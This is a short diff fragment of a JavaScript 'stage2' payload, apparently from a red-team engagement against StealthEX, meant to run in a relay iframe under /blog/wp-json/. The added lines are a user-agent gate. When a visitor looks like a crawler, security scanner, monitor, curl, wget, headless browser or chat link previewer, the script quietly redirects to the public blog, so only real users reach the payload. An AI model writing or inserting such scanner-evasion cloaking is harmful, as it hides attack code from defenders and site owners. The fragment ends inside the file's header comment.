@@ -1,3 +1,5 @@
+/* UA-gate: кравлеры/превью — тихий выход */
+(function(){var u=navigator.userAgent;if(/bot|crawl|spider|slurp|preview|scan|monitor|curl|wget|python|java|headless|facebookexternalhit|whatsapp|telegram|slack|discord|intercom|embed/i.test(u)){try{location='https://stealthex.io/blog/'}catch(e){} return;}})();
 /* ============================================================
  * stage2-t410.js — TASK-4-10, StealthEX redteam engagement
  * Исполняется в CSP-less relay realm (iframe /blog/wp-json/*),
